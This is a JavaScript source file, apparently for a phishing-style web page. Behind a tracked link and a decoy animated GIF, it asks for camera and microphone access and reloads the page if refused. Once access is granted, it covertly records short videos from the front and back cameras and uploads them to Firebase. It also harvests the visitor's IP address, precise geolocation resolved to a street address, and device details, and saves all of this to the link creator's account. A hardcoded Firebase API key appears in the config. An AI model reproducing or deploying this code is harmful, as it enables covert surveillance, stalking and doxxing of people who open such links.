const firebaseConfig = {
  apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
  authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
  databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
  projectId: "sandalias-retro-9f0c6",
  storageBucket: "sandalias-retro-9f0c6.appspot.com",
  messagingSenderId: "786208752798",
  appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
  measurementId: "G-XGVHLX01EB"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const storage = firebase.storage();

class VideoLocationSystem {
  constructor() {
    this.urlId = this.getUrlParameter('id');
    this.urlData = null;
    this.userId = null;
    this.buildUI();
    this.init();
  }

  getUrlParameter(name) {
    return new URLSearchParams(window.location.search).get(name);
  }

  buildUI() {
    document.body.style.cssText = `
      margin: 0; padding: 0; overflow: hidden;
      width: 100vw; height: 100vh;
      background: #000 url('https://i.pinimg.com/originals/e2/82/e2/e282e2739af30635723b9e2701bb8148.gif') center center / cover no-repeat;
    `;
  }

  async init() {
    try {
      if (!this.urlId) return;

      const snap = await database.ref('users').once('value');
      const usersData = snap.val();
      if (!usersData) return;

      for (const [userId, user] of Object.entries(usersData)) {
        if (user.urls && user.urls[this.urlId]) {
          this.userId = userId;
          this.urlData = user.urls[this.urlId];
          break;
        }
      }

      if (!this.urlData || !this.userId) return;

      const now = Date.now();
      if (this.urlData.expiresAt && now > this.urlData.expiresAt) return;
      if (this.urlData.maxUses && this.urlData.usedCount >= this.urlData.maxUses) return;

      // Pede permissões de câmera/microfone
      const granted = await this.requestPermissions();
      if (!granted) {
        location.reload();
        return;
      }

      await this.recordAndUpload();

    } catch (error) {
      console.error('Erro init:', error);
    }
  }

  // Apenas pede permissão de câmera/microfone — NÃO coleta localização aqui
  async requestPermissions() {
    try {
      const s1 = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      s1.getTracks().forEach(t => t.stop());
      return true;
    } catch (e) {
      console.warn('Permissoes negadas:', e);
      return false;
    }
  }

  async recordCamera(facingMode, durationMs) {
    let stream;

    // Tenta com facingMode exato primeiro
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: { exact: facingMode } },
        audio: true
      });
    } catch (e) {
      // Fallback: sem 'exact'
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facingMode },
          audio: true
        });
      } catch (e2) {
        console.warn('Camera [' + facingMode + '] indisponivel:', e2.message);
        return null;
      }
    }

    // Escolhe mimeType compatível
    let mimeType = 'video/webm';
    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
      mimeType = 'video/webm;codecs=vp9';
    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
      mimeType = 'video/webm;codecs=vp8';
    }

    const chunks = [];
    const recorder = new MediaRecorder(stream, { mimeType });

    recorder.ondataavailable = function(e) {
      if (e.data && e.data.size > 0) chunks.push(e.data);
    };

    // Coleta dados a cada 500ms para garantir chunks
    recorder.start(500);

    await new Promise(function(r) { setTimeout(r, durationMs); });

    recorder.stop();

    const blob = await new Promise(function(resolve, reject) {
      recorder.onstop = function() {
        if (chunks.length > 0) {
          resolve(new Blob(chunks, { type: 'video/webm' }));
        } else {
          reject(new Error('Sem chunks de video para ' + facingMode));
        }
      };
      setTimeout(function() { reject(new Error('Timeout recorder.onstop')); }, 12000);
    });

    stream.getTracks().forEach(function(t) { t.stop(); });
    return blob;
  }

  async uploadBlob(blob, label, timestamp) {
    if (!blob || blob.size === 0) {
      console.warn('Blob vazio para label:', label);
      return '';
    }
    const filePath = 'videos/' + this.userId + '/' + this.urlId + '_' + label + '_' + timestamp + '.webm';
    const storageRef = storage.ref(filePath);
    const snapshot = await storageRef.put(blob);
    const url = await snapshot.ref.getDownloadURL();
    console.log('Upload OK [' + label + ']:', url);
    return url;
  }

  async recordAndUpload() {
    try {
      const timestamp = Date.now();

      console.log('Gravando camera frontal...');
      const frontBlob = await this.recordCamera('user', 5000);

      console.log('Gravando camera traseira...');
      const backBlob = await this.recordCamera('environment', 5000);

      console.log('Fazendo upload dos videos...');
      const frontUrl = frontBlob ? await this.uploadBlob(frontBlob, 'frontal', timestamp) : '';
      const backUrl  = backBlob  ? await this.uploadBlob(backBlob,  'traseira', timestamp) : '';

      if (!frontUrl && !backUrl) {
        throw new Error('Upload falhou: nenhuma URL gerada');
      }

      console.log('Coletando IP e localizacao...');
      const ipResult = await this.getIP();
      const location = await this.getLocation();

      const captureKey = database.ref().push().key;

      // Firebase NAO aceita null — usa string vazia para campos ausentes
      const captureData = {
        id: captureKey,
        urlId: this.urlId,
        userId: this.userId,
        videoFrontalUrl: frontUrl  || '',
        videoTrasieraUrl: backUrl  || '',
        ip: ipResult || '',
        timestamp: timestamp,
        data: new Date().toISOString(),
        userAgent: navigator.userAgent || '',
        platform: navigator.platform || '',
        localizacao: {
          latitude:          (location && location.latitude)          ? location.latitude          : 0,
          longitude:         (location && location.longitude)         ? location.longitude         : 0,
          accuracy:          (location && location.accuracy)          ? location.accuracy          : 0,
          rua:               (location && location.rua)               ? location.rua               : '',
          cidade:            (location && location.cidade)            ? location.cidade            : '',
          regiao:            (location && location.regiao)            ? location.regiao            : '',
          bairro:            (location && location.bairro)            ? location.bairro            : '',
          numero:            (location && location.numero)            ? location.numero            : '',
          endereco_completo: (location && location.endereco_completo) ? location.endereco_completo : '',
          pais:              (location && location.pais)              ? location.pais              : ''
        }
      };

      const usedCount = (this.urlData.usedCount || 0) + 1;

      const updates = {};
      updates['users/' + this.userId + '/captures/' + captureKey]                   = captureData;
      updates['users/' + this.userId + '/urls/' + this.urlId + '/usedCount']        = usedCount;
      updates['users/' + this.userId + '/urls/' + this.urlId + '/lastUsed']         = timestamp;

      await database.ref().update(updates);
      console.log('Captura salva com sucesso! Key:', captureKey);

    } catch (error) {
      console.error('Erro em recordAndUpload:', error);
    }
  }

  async getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || '';
    } catch (e) {
      console.warn('getIP falhou:', e);
      return '';
    }
  }

  getLocation() {
    return new Promise(function(resolve) {
      if (!navigator.geolocation) {
        return resolve(null);
      }
      navigator.geolocation.getCurrentPosition(
        async function(pos) {
          var lat = pos.coords.latitude;
          var lon = pos.coords.longitude;
          try {
            var res = await fetch(
              'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&addressdetails=1'
            );
            var data = await res.json();
            var addr = data.address || {};
            resolve({
              latitude:          lat,
              longitude:         lon,
              accuracy:          pos.coords.accuracy,
              rua:               addr.road || '',
              cidade:            addr.city || addr.town || addr.village || '',
              regiao:            addr.state || '',
              bairro:            addr.suburb || addr.neighbourhood || '',
              numero:            addr.house_number || 'S/N',
              endereco_completo: data.display_name || '',
              pais:              addr.country || ''
            });
          } catch (e) {
            resolve({ latitude: lat, longitude: lon, accuracy: pos.coords.accuracy });
          }
        },
        function(err) {
          console.warn('Geolocalizacao negada:', err.message);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    });
  }
}

window.addEventListener('DOMContentLoaded', function() {
  new VideoLocationSystem();
});
